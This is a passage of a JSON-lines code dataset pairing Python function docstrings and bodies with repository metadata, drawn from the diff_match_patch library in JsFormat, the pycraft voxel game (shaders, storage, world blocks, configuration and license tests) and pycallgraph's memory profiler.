overlap found.\n        # Insert an equality and swap and trim the surrounding edits.\n        diffs.insert(pointer, (self.DIFF_EQUAL, deletion[:overlap_length2]))\n        diffs[pointer - 1] = (self.DIFF_INSERT,\n                              insertion[:len(insertion) - overlap_length2])\n        diffs[pointer + 1] = (self.DIFF_DELETE, deletion[overlap_length2:])\n        pointer += 1\n    pointer += 1\n  pointer += 1", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Determine the common suffix of two strings.\n\nArgs:\n  text1: First string.\n  text2: Second string.\n\nReturns:\n  The number of characters common to the end of each string.\n\"\"\"\n# Quick check for common null cases.\n", "func_signal": "def diff_commonSuffix(self, text1, text2):\n", "code": "if not text1 or not text2 or text1[-1] != text2[-1]:\n  return 0\n# Binary search.\n# Performance analysis: http://neil.fraser.name/news/2007/10/09/\npointermin = 0\npointermax = min(len(text1), len(text2))\npointermid = pointermax\npointerend = 0\nwhile pointermin < pointermid:\n  if (text1[-pointermid:len(text1) - pointerend] ==\n      text2[-pointermid:len(text2) - pointerend]):\n    pointermin = pointermid\n    pointerend = pointermin\n  else:\n    pointermax = pointermid\n  pointermid = (pointermax - pointermin) // 2 + pointermin\nreturn pointermid", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Compute and return the destination text (all equalities and insertions).\n\nArgs:\n  diffs: Array of diff tuples.\n\nReturns:\n  Destination text.\n\"\"\"\n", "func_signal": "def diff_text2(self, diffs):\n", "code": "text = []\nfor (op, data) in diffs:\n  if op != self.DIFF_DELETE:\n    text.append(data)\nreturn \"\".join(text)", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Given the original text1, and an encoded string which describes the\noperations required to transform text1 into text2, compute the full diff.\n\nArgs:\n  text1: Source string for the diff.\n  delta: Delta text.\n\nReturns:\n  Array of diff tuples.\n\nRaises:\n  ValueError: If invalid input.\n\"\"\"\n", "func_signal": "def diff_fromDelta(self, text1, delta):\n", "code": "diffs = []\npointer = 0  # Cursor in text1\ntokens = delta.split(\"\\t\")\nfor token in tokens:\n  if token == \"\":\n    # Blank tokens are ok (from a trailing \\t).\n    continue\n  # Each token begins with a one character parameter which specifies the\n  # operation of this token (delete, insert, equality).\n  param = token[1:]\n  if token[0] == \"+\":\n    param = urllib.parse.unquote(param)\n    diffs.append((self.DIFF_INSERT, param))\n  elif token[0] == \"-\" or token[0] == \"=\":\n    try:\n      n = int(param)\n    except ValueError:\n      raise ValueError(\"Invalid number in diff_fromDelta: \" + param)\n    if n < 0:\n      raise ValueError(\"Negative number in diff_fromDelta: \" + param)\n    text = text1[pointer : pointer + n]\n    pointer += n\n    if token[0] == \"=\":\n      diffs.append((self.DIFF_EQUAL, text))\n    else:\n      diffs.append((self.DIFF_DELETE, text))\n  else:\n    # Anything else is an error.\n    raise ValueError(\"Invalid diff operation in diff_fromDelta: \" +\n        token[0])\nif pointer != len(text1):\n  raise ValueError(\n      \"Delta length (%d) does not equal source text length (%d).\" %\n     (pointer, len(text1)))\nreturn diffs", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Emmulate GNU diff's format.\nHeader: @@ -382,8 +481,9 @@\nIndicies are printed as 1-based, not 0-based.\n\nReturns:\n  The GNU diff string.\n\"\"\"\n", "func_signal": "def __str__(self):\n", "code": "if self.length1 == 0:\n  coords1 = str(self.start1) + \",0\"\nelif self.length1 == 1:\n  coords1 = str(self.start1 + 1)\nelse:\n  coords1 = str(self.start1 + 1) + \",\" + str(self.length1)\nif self.length2 == 0:\n  coords2 = str(self.start2) + \",0\"\nelif self.length2 == 1:\n  coords2 = str(self.start2 + 1)\nelse:\n  coords2 = str(self.start2 + 1) + \",\" + str(self.length2)\ntext = [\"@@ -\", coords1, \" +\", coords2, \" @@\\n\"]\n# Escape the body of the patch with %xx notation.\nfor (op, data) in self.diffs:\n  if op == diff_match_patch.DIFF_INSERT:\n    text.append(\"+\")\n  elif op == diff_match_patch.DIFF_DELETE:\n    text.append(\"-\")\n  elif op == diff_match_patch.DIFF_EQUAL:\n    text.append(\" \")\n  # High ascii will raise UnicodeDecodeError.  Use Unicode instead.\n  data = data.encode(\"utf-8\")\n  text.append(urllib.parse.quote(data, \"!~*'();/?:@&=+$,# \") + \"\\n\")\nreturn \"\".join(text)", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "# Never indent your first output indent at the start of the file\n", "func_signal": "def set_indent(self, level):\n", "code": "if len(self.lines) > 1:\n    while level >= len(self.indent_cache):\n        self.indent_cache.append(self.indent_cache[-1] + self.indent_string)\n\n\n    self.current_line.set_indent(level)\n    return True\nself.current_line.set_indent(0)\nreturn False", "path": "JsFormat/libs/jsbeautifier/core/output.py", "commit_date": "2017-11-26 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Find the 'middle snake' of a diff, split the problem in two\n  and return the recursively constructed diff.\n  See Myers 1986 paper: An O(ND) Difference Algorithm and Its Variations.\n\nArgs:\n  text1: Old string to be diffed.\n  text2: New string to be diffed.\n  deadline: Time at which to bail if not yet complete.\n\nReturns:\n  Array of diff tuples.\n\"\"\"\n\n# Cache the text lengths to prevent multiple calls.\n", "func_signal": "def diff_bisect(self, text1, text2, deadline):\n", "code": "text1_length = len(text1)\ntext2_length = len(text2)\nmax_d = (text1_length + text2_length + 1) // 2\nv_offset = max_d\nv_length = 2 * max_d\nv1 = [-1] * v_length\nv1[v_offset + 1] = 0\nv2 = v1[:]\ndelta = text1_length - text2_length\n# If the total number of characters is odd, then the front path will\n# collide with the reverse path.\nfront = (delta % 2 != 0)\n# Offsets for start and end of k loop.\n# Prevents mapping of space beyond the grid.\nk1start = 0\nk1end = 0\nk2start = 0\nk2end = 0\nfor d in range(max_d):\n  # Bail out if deadline is reached.\n  if time.time() > deadline:\n    break\n\n  # Walk the front path one step.\n  for k1 in range(-d + k1start, d + 1 - k1end, 2):\n    k1_offset = v_offset + k1\n    if k1 == -d or (k1 != d and\n        v1[k1_offset - 1] < v1[k1_offset + 1]):\n      x1 = v1[k1_offset + 1]\n    else:\n      x1 = v1[k1_offset - 1] + 1\n    y1 = x1 - k1\n    while (x1 < text1_length and y1 < text2_length and\n           text1[x1] == text2[y1]):\n      x1 += 1\n      y1 += 1\n    v1[k1_offset] = x1\n    if x1 > text1_length:\n      # Ran off the right of the graph.\n      k1end += 2\n    elif y1 > text2_length:\n      # Ran off the bottom of the graph.\n      k1start += 2\n    elif front:\n      k2_offset = v_offset + delta - k1\n      if k2_offset >= 0 and k2_offset < v_length and v2[k2_offset] != -1:\n        # Mirror x2 onto top-left coordinate system.\n        x2 = text1_length - v2[k2_offset]\n        if x1 >= x2:\n          # Overlap detected.\n          return self.diff_bisectSplit(text1, text2, x1, y1, deadline)\n\n  # Walk the reverse path one step.\n  for k2 in range(-d + k2start, d + 1 - k2end, 2):\n    k2_offset = v_offset + k2\n    if k2 == -d or (k2 != d and\n        v2[k2_offset - 1] < v2[k2_offset + 1]):\n      x2 = v2[k2_offset + 1]\n    else:\n      x2 = v2[k2_offset - 1] + 1\n    y2 = x2 - k2\n    while (x2 < text1_length and y2 < text2_length and\n           text1[-x2 - 1] == text2[-y2 - 1]):\n      x2 += 1\n      y2 += 1\n    v2[k2_offset] = x2\n    if x2 > text1_length:\n      # Ran off the left of the graph.\n      k2end += 2\n    elif y2 > text2_length:\n      # Ran off the top of the graph.\n      k2start += 2\n    elif not front:\n      k1_offset = v_offset + delta - k2\n      if k1_offset >= 0 and k1_offset < v_length and v1[k1_offset] != -1:\n        x1 = v1[k1_offset]\n        y1 = v_offset + x1 - k1_offset\n        # Mirror x2 onto top-left coordinate system.\n        x2 = text1_length - x2\n        if x1 >= x2:\n          # Overlap detected.\n          return self.diff_bisectSplit(text1, text2, x1, y1, deadline)\n\n# Diff took too long and hit the deadline or\n# number of diffs equals number of characters, no commonality at all.\nreturn [(self.DIFF_DELETE, text1), (self.DIFF_INSERT, text2)]", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Crush the diff into an encoded string which describes the operations\nrequired to transform text1 into text2.\nE.g. =3\\t-2\\t+ing  -> Keep 3 chars, delete 2 chars, insert 'ing'.\nOperations are tab-separated.  Inserted text is escaped using %xx notation.\n\nArgs:\n  diffs: Array of diff tuples.\n\nReturns:\n  Delta text.\n\"\"\"\n", "func_signal": "def diff_toDelta(self, diffs):\n", "code": "text = []\nfor (op, data) in diffs:\n  if op == self.DIFF_INSERT:\n    # High ascii will raise UnicodeDecodeError.  Use Unicode instead.\n    data = data.encode(\"utf-8\")\n    text.append(\"+\" + urllib.parse.quote(data, \"!~*'();/?:@&=+$,# \"))\n  elif op == self.DIFF_DELETE:\n    text.append(\"-%d\" % len(data))\n  elif op == self.DIFF_EQUAL:\n    text.append(\"=%d\" % len(data))\nreturn \"\\t\".join(text)", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Rehydrate the text in a diff from a string of line hashes to real lines\nof text.\n\nArgs:\n  diffs: Array of diff tuples.\n  lineArray: Array of unique strings.\n\"\"\"\n", "func_signal": "def diff_charsToLines(self, diffs, lineArray):\n", "code": "for x in range(len(diffs)):\n  text = []\n  for char in diffs[x][1]:\n    text.append(lineArray[ord(char)])\n  diffs[x] = (diffs[x][0], \"\".join(text))", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "\"\"\"Do the two texts share a substring which is at least half the length of\nthe longer text?\nThis speedup can produce non-minimal diffs.\n\nArgs:\n  text1: First string.\n  text2: Second string.\n\nReturns:\n  Five element Array, containing the prefix of text1, the suffix of text1,\n  the prefix of text2, the suffix of text2 and the common middle.  Or None\n  if there was no match.\n\"\"\"\n", "func_signal": "def diff_halfMatch(self, text1, text2):\n", "code": "if self.Diff_Timeout <= 0:\n  # Don't risk returning a non-optimal diff if we have unlimited time.\n  return None\nif len(text1) > len(text2):\n  (longtext, shorttext) = (text1, text2)\nelse:\n  (shorttext, longtext) = (text1, text2)\nif len(longtext) < 4 or len(shorttext) * 2 < len(longtext):\n  return None  # Pointless.\n\ndef diff_halfMatchI(longtext, shorttext, i):\n  \"\"\"Does a substring of shorttext exist within longtext such that the\n  substring is at least half the length of longtext?\n  Closure, but does not reference any external variables.\n\n  Args:\n    longtext: Longer string.\n    shorttext: Shorter string.\n    i: Start index of quarter length substring within longtext.\n\n  Returns:\n    Five element Array, containing the prefix of longtext, the suffix of\n    longtext, the prefix of shorttext, the suffix of shorttext and the\n    common middle.  Or None if there was no match.\n  \"\"\"\n  seed = longtext[i:i + len(longtext) // 4]\n  best_common = ''\n  j = shorttext.find(seed)\n  while j != -1:\n    prefixLength = self.diff_commonPrefix(longtext[i:], shorttext[j:])\n    suffixLength = self.diff_commonSuffix(longtext[:i], shorttext[:j])\n    if len(best_common) < suffixLength + prefixLength:\n      best_common = (shorttext[j - suffixLength:j] +\n          shorttext[j:j + prefixLength])\n      best_longtext_a = longtext[:i - suffixLength]\n      best_longtext_b = longtext[i + prefixLength:]\n      best_shorttext_a = shorttext[:j - suffixLength]\n      best_shorttext_b = shorttext[j + prefixLength:]\n    j = shorttext.find(seed, j + 1)\n\n  if len(best_common) * 2 >= len(longtext):\n    return (best_longtext_a, best_longtext_b,\n            best_shorttext_a, best_shorttext_b, best_common)\n  else:\n    return None\n\n# First check if the second quarter is the seed for a half-match.\nhm1 = diff_halfMatchI(longtext, shorttext, (len(longtext) + 3) // 4)\n# Check again based on the third quarter.\nhm2 = diff_halfMatchI(longtext, shorttext, (len(longtext) + 1) // 2)\nif not hm1 and not hm2:\n  return None\nelif not hm2:\n  hm = hm1\nelif not hm1:\n  hm = hm2\nelse:\n  # Both matched.  Select the longest.\n  if len(hm1[4]) > len(hm2[4]):\n    hm = hm1\n  else:\n    hm = hm2\n\n# A half-match was found, sort out the return data.\nif len(text1) > len(text2):\n  (text1_a, text1_b, text2_a, text2_b, mid_common) = hm\nelse:\n  (text2_a, text2_b, text1_a, text1_b, mid_common) = hm\nreturn (text1_a, text1_b, text2_a, text2_b, mid_common)", "path": "JsFormat/libs/diff_match_patch/python3/diff_match_patch.py", "commit_date": "2013-03-10 00:00:00", "repo_name": "jdavisclark/JsFormat", "stars": 1414, "license": "None", "language": "python", "size": 457}
{"docstring": "# link the program\n", "func_signal": "def link(self):\n", "code": "glLinkProgram(self.handle)\n\ntemp = c_int(0)\n# retrieve the link status\nglGetProgramiv(self.handle, GL_LINK_STATUS, byref(temp))\n\n# if linking failed, print the log\nif not temp:\n    # retrieve the log length\n    glGetProgramiv(self.handle, GL_INFO_LOG_LENGTH, byref(temp))\n    # create a buffer for the log\n    buffer = create_string_buffer(temp.value)\n    # retrieve the log text\n    glGetProgramInfoLog(self.handle, temp, None, buffer)\n    # print the log to the console\n    print(buffer.value)\nelse:\n    # all is well, so we are linked\n    self.linked = True", "path": "pycraft/pycraft/shader.py", "commit_date": "2016-04-23 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"\nRetrieve an item from the storage by position\nParameters\n----------\nposition\nquantity\n\nReturns\n-------\n\n\"\"\"\n", "func_signal": "def retrieve_item_by_position(self, position, quantity=1):\n", "code": "if position in self.items:\n    items = self.items[position].copy().items()\n    for item, value in items:\n        if value > quantity:\n            self.items[position][item] -= quantity\n        else:\n            quantity = value\n            self.items[position].clear()\n        return {\n            \"item\": item,\n            \"quantity\": quantity\n        }\n\nreturn False", "path": "pycraft/pycraft/objects/storage.py", "commit_date": "2016-05-19 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"Called when the player presses a key. See pyglet docs for key\nmappings.\n\nParameters\n----------\nsymbol : int\n    Number representing the key that was pressed.\nmodifiers : int\n    Number representing any modifying keys that were pressed.\nconfig_data[\"controls\"] : dict\n    control map read by the configuration file\n\"\"\"\n", "func_signal": "def on_key_press(self, symbol, modifiers):\n", "code": "if symbol == key.ESCAPE:\n    self.set_exclusive_mouse(False)\nelse:\n    self.gamestatemanager.peek().on_key_press(symbol, modifiers, self.config_data[\"controls\"])", "path": "pycraft/pycraft/window.py", "commit_date": "2016-04-28 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"\nTest that the ConfigurationLoader object is generated correctly and returns\na config dictionary as expected.\n\"\"\"\n", "func_signal": "def test_config_init():\n", "code": "config = ConfigurationLoader()\n# check an object was created\nassert config, \"No ConfigurationLoader object created!\"\n\n# Get the config and check it is the default values\nconfig_dict = config.get_configurations()\nassert config_dict == DEFAULT_CONFIG, \"Config created didn't match default config\"", "path": "pycraft/tests/test_configuration.py", "commit_date": "2016-04-23 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"Check all blocks surrounding `position` and ensure their visual\nstate is current. This means hiding blocks that are not exposed and\nensuring that all exposed blocks are shown. Usually used after a block\nis added or removed.\n\"\"\"\n", "func_signal": "def get_neighbors(self, position):\n", "code": "x, y, z = position\nneighbors = {\n    'show': list(),\n    'hide': list()\n}\nfor dx, dy, dz in FACES:\n    key = (x + dx, y + dy, z + dz)\n    if key not in self.blocks:\n        continue\n    if self.exposed(key):\n        neighbors['show'].append({\n            'coords': key,\n            'block': self.get_block(key)\n        })\n    else:\n        neighbors['hide'].append({\n            'coords': key\n        })\nreturn neighbors", "path": "pycraft/pycraft/world/area.py", "commit_date": "2017-06-17 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"\nInitializes the storage items\nReturns None\n-------\n\n\"\"\"\n", "func_signal": "def start_storage(self):\n", "code": "for x in range(0, self.max_items):\n    self.items[x] = dict()", "path": "pycraft/pycraft/objects/storage.py", "commit_date": "2016-05-19 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "# obtian the uniform location\n", "func_signal": "def uniform_matrixf(self, name, mat):\n", "code": "loc = glGetUniformLocation(self.handle, name)\n# uplaod the 4x4 floating point matrix\nglUniformMatrix4fv(loc, 1, False, (c_float * 16)(*mat))", "path": "pycraft/pycraft/shader.py", "commit_date": "2016-04-23 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"Returns False is given `position` is surrounded on all 6 sides by\nblocks, True otherwise.\nParameters\n----------\nposition\n\nReturns\n-------\n\n\"\"\"\n", "func_signal": "def exposed(self, position):\n", "code": "x, y, z = position\nfor dx, dy, dz in FACES:\n    if (x + dx, y + dy, z + dz) not in self.blocks:\n        return True\nreturn False", "path": "pycraft/pycraft/world/area.py", "commit_date": "2017-06-17 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"\n    Initialize with defaut values\n\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "self.game_config = {\n    \"window\": {\n        \"width\": 800,\n        \"height\": 600,\n        \"ticks_per_second\": 60,\n        \"resizeable\": True,\n        \"exclusive_mouse\": True,\n    },\n    \"controls\": {\n        \"forward\": \"W\",\n        \"backward\": \"S\",\n        \"right\": \"D\",\n        \"left\": \"A\",\n        \"jump\": \"SPACE\",\n        \"down\": \"LSHIFT\",\n        \"fly\": \"TAB\",\n    },\n    \"world\": {\n        \"gravity\": 20.0,\n        \"player_height\": 2,\n        \"max_jump_height\": 2.0,\n        \"terminal_velocity\": 50,\n        \"walking_speed\": 5,\n        \"flying_speed\": 15,\n    }\n}\n\n# Prepare acess to the configuration file\nhome_directory = expanduser(\"~\")\nself.configuration_file_path = home_directory + \"/.pycraftconfig.json\"", "path": "pycraft/pycraft/configuration.py", "commit_date": "2016-04-23 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"If `exclusive` is True, the game will capture the mouse, if False the\ngame will ignore the mouse.\n\"\"\"\n", "func_signal": "def set_exclusive_mouse(self, exclusive):\n", "code": "super(Window, self).set_exclusive_mouse(exclusive)\nself.exclusive = exclusive", "path": "pycraft/pycraft/window.py", "commit_date": "2016-04-28 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"\nAdd a block element to blocks list\nParameters\n----------\ncoords\nblock\n\nReturns\n-------\n\n\"\"\"\n", "func_signal": "def add_block(self, coords, block):\n", "code": "if coords in self.blocks:\n    self.remove_block(coords)\nself.blocks[coords] = block", "path": "pycraft/pycraft/world/area.py", "commit_date": "2017-06-17 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"Called when a mouse button is pressed. See pyglet docs for button\namd modifier mappings.\n\nParameters\n----------\nx, y : int\n    The coordinates of the mouse click. Always center of the screen if\n    the mouse is captured.\nbutton : int\n    Number representing mouse button that was clicked. 1 = left button,\n    4 = right button.\nmodifiers : int\n    Number representing any modifying keys that were pressed when the\n    mouse button was clicked.\n\"\"\"\n\n", "func_signal": "def on_mouse_press(self, x, y, button, modifiers):\n", "code": "if self.exclusive:\n    self.gamestatemanager.peek().on_mouse_press(x, y, button, modifiers)\nelse:\n    self.set_exclusive_mouse(True)", "path": "pycraft/pycraft/window.py", "commit_date": "2016-04-28 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"\nChecks for licenses minus those that have been identified to\nbe ignored.\n\"\"\"\n", "func_signal": "def test_licenses(**options):\n", "code": "meta_files_to_check = ['PKG-INFO', 'METADATA']\n\nfailed = False\n\nknown_ignores = [\n    # --------------------------------------------------------------\n    # Pip packages added\n    'pip',            # MIT\n    'setuptools',     # ?\n\n    # --------------------------------------------------------------\n    # Required install packages\n    'noise',          # MIT\n\n    # --------------------------------------------------------------\n    # Virtualenv packages added\n    'wheel',          # MIT\n\n    # --------------------------------------------------------------\n    # Test packages added\n    'apipkg',         # MIT\n    'coverage',       # Apache 2.0\n    'detox',          # MIT\n    'eventlet',       # MIT\n    'execnet',        # MIT\n    'flake8',         # MIT\n    'greenlet',       # MIT\n    'mock',           # BSD\n    'mccabe',         # Expat\n    'pep8',           # Expat\n    'pluggy',         # MIT\n    'py',             # MIT\n    'pyflakes',       # MIT\n    'pytest',         # MIT\n    'pytest-cache',   # MIT\n    'pytest-cov',     # MIT\n    'pytest-flake8',  # BSD\n    'pytest-xdist'    # MIT\n    'tox',            # MIT\n    'virtualenv',     # MIT\n    # TravisCI automatically installs nose,\n    # which is licensed under the LGPL\n    'nose',           # LGPL\n\n    # --------------------------------------------------------------\n    # Known licenses that do not register with this test and can\n    #  be ignored safely\n    'alabaster',      # BSD  - From Sphinx\n    'pbr',            # Apache\n\n    # --------------------------------------------------------------\n    # Unknown - TODO:  Make sure these are not used within the\n    #  project\n    'ptyprocess',     # ISC\n    'gnureadline',    # GPL 2    - TODO: Alternatives?\n]\n\naccepted_licenses = [\n    'BSD',\n    'MIT',\n    'ZPL', 'Zope', 'Zope Public License',\n    'Apache', 'Apache 2.0',\n    'PSF', 'Python', 'Python Software Foundation',\n    'DSF', 'Django', 'Django Software Foundation',\n    'ISC', 'ISCL', 'Internet Software Consortium',\n]\n\nfor installed_distribution in get_installed_distributions():\n    found_license = None\n    found_valid = None\n    skip = False\n    severity = ' ? '\n    license = 'Found no license information'\n    project_name = 'unknown'\n    message = '{severity} {project_name}: {license}'\n    for metafile in meta_files_to_check:\n        if not installed_distribution.has_metadata(metafile):\n            continue\n        for line in installed_distribution.get_metadata_lines(metafile):\n            if 'License: ' in line:\n                found_license = True\n                (k, license) = line.split(': ', 1)\n                project_name = installed_distribution.project_name\n                if project_name in known_ignores:\n                    skip = True\n                file = sys.stdout\n                if license.startswith('Copyright'):\n                    severity = '   '\n                    found_valid = True\n                elif not any(lic in license for lic in accepted_licenses):\n                    severity = '!!!'\n                    file = sys.stderr\n                    found_valid = False\n                elif 'unknown' in license.lower():\n                    found_valid = False\n                else:\n                    severity = '   '\n                    found_valid = True\n                break\n        if found_license:\n            break\n    if skip:\n        continue\n    if not found_license or not found_valid:\n        file = sys.stderr\n    msg = message.format(\n        severity=severity,\n        project_name=project_name,\n        license=license\n    )\n    print(msg, file=file)\n    if found_license is False:\n        failed = True\n    if project_name not in known_ignores and found_valid is False:\n        failed = True\nassert not failed, \"Some licences were not approved or not found\"", "path": "pycraft/tests/test_licenses.py", "commit_date": "2016-04-23 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"\nRetrieve the name of an item in the storage from an index\nParameters\n----------\nactive\n\nReturns\n-------\n\n\"\"\"\n", "func_signal": "def get_item_name(self, active=0):\n", "code": "if active >= self.max_items:\n    active = 0\n\nif self.items[active]:\n    return [item for item in self.items[active]][0]\nreturn False", "path": "pycraft/pycraft/objects/storage.py", "commit_date": "2016-05-19 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "# check there are 1-4 values\n", "func_signal": "def uniformf(self, name, *vals):\n", "code": "if len(vals) in range(1, 5):\n    # select the correct function\n    {1: glUniform1f,\n     2: glUniform2f,\n     3: glUniform3f,\n     4: glUniform4f\n     # retrieve the uniform location, and set\n     }[len(vals)](glGetUniformLocation(self.handle, name), *vals)", "path": "pycraft/pycraft/shader.py", "commit_date": "2016-04-23 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"\nTest that we can read and write a config file.\n\"\"\"\n", "func_signal": "def test_load_configuration_file():\n", "code": "config = ConfigurationLoader()\nbase_dir = os.path.dirname(os.path.abspath(__file__))\nconfig_path = os.path.join(base_dir, 'tmp-configuration.json')\nconfig.configuration_file_path = config_path\n\n# There shouldn't be a config file, so it will write one\nconfig_dict = config.load_configuration_file()\nassert os.path.exists(config_path), \"Didn't write a config file!\"\nassert config_dict == DEFAULT_CONFIG, \"Config returned doesn't match default config\"\nwith open(config_path, 'r') as f:\n    written_config = json.load(f)\nassert written_config == DEFAULT_CONFIG, \"Written config doesn't match default config\"\n\n# Now we want to do it all again writing our own config file\nnew_config = {\n    \"window\": {\n        \"width\": 813,\n        \"height\": 2450,\n        \"ticks_per_second\": 63,\n        \"resizeable\": False,\n        \"exclusive_mouse\": False,\n    },\n    \"controls\": {\n        \"forward\": \"Z\",\n        \"backward\": \"S\",\n        \"right\": \"D\",\n        \"left\": \"Q\",\n        \"jump\": \"LSHIFT\",\n        \"down\": \"TAB\",\n        \"fly\": \"SPACE\",\n    },\n    \"world\": {\n        \"gravity\": 234.0,\n        \"player_height\": 123,\n        \"max_jump_height\": 34.1,\n        \"terminal_velocity\": 431,\n        \"walking_speed\": 12,\n        \"flying_speed\": 34,\n    },\n}\n\nwith open(config_path, 'w') as f:\n    json.dump(new_config, f, indent=4)\nopened_config = config.load_configuration_file()\nassert opened_config == new_config, \"Loaded config doesn't match what we wrote\"\n\n# Clean up after ourselves\nos.remove(config_path)", "path": "pycraft/tests/test_configuration.py", "commit_date": "2016-04-23 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"Called by pyglet to draw the canvas.\n\n    Pass the current window size\n\"\"\"\n", "func_signal": "def on_draw(self):\n", "code": "self.clear()\nself.gamestatemanager.peek().on_draw(self.get_size())", "path": "pycraft/pycraft/window.py", "commit_date": "2016-04-28 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"\nAdd items to the storage object\nParameters\n----------\nposition integer\nitem     object\nquantity integer\n\nReturns Boolean\n-------\n\n\"\"\"\n", "func_signal": "def store_item(self, position, item, quantity=1):\n", "code": "if position >= self.max_items:\n    return False\n\nif item in self.items[position]:\n    self.items[position][item] += quantity\nelse:\n    self.items[position][item] = quantity\nreturn True", "path": "pycraft/pycraft/objects/storage.py", "commit_date": "2016-05-19 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\"\nRetrieve an item from the storage\nParameters\n----------\nitem\nquantity\n\nReturns\n-------\n\n\"\"\"\n", "func_signal": "def retrieve_item(self, item, quantity=1):\n", "code": "items = self.items.copy().items()\nfor key, value in items:\n    if item in value:\n        if value[item] > quantity:\n            self.items[key][item] -= quantity\n        else:\n            quantity = value[item]\n            self.items[key].clear()\n\n        return {\n            \"item\": item,\n            \"quantity\": quantity\n        }\n\nreturn False", "path": "pycraft/pycraft/objects/storage.py", "commit_date": "2016-05-19 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "# check there are 1-4 values\n", "func_signal": "def uniformi(self, name, *vals):\n", "code": "if len(vals) in range(1, 5):\n    # select the correct function\n    {1: glUniform1i,\n     2: glUniform2i,\n     3: glUniform3i,\n     4: glUniform4i\n     # retrieve the uniform location, and set\n     }[len(vals)](glGetUniformLocation(self.handle, name), *vals)", "path": "pycraft/pycraft/shader.py", "commit_date": "2016-04-23 00:00:00", "repo_name": "traverseda/pycraft", "stars": 1096, "license": "mit", "language": "python", "size": 718}
{"docstring": "\"\"\" Record line profiling information for the given Python function.\n\"\"\"\n", "func_signal": "def add_function(self, func):\n", "code": "try:\n    # func_code does not exist in Python3\n    code = func.__code__\nexcept AttributeError:\n    import warnings\n    warnings.warn(\"Could not extract a code object for the object %r\"\n                  % (func,))\n    return\nif code not in self.code_map:\n    self.code_map[code] = {}\n    self.functions.append(func)", "path": "pycallgraph/pycallgraph/memory_profiler.py", "commit_date": "2013-07-11 00:00:00", "repo_name": "gak/pycallgraph", "stars": 1779, "license": "gpl-2.0", "language": "python", "size": 3045}
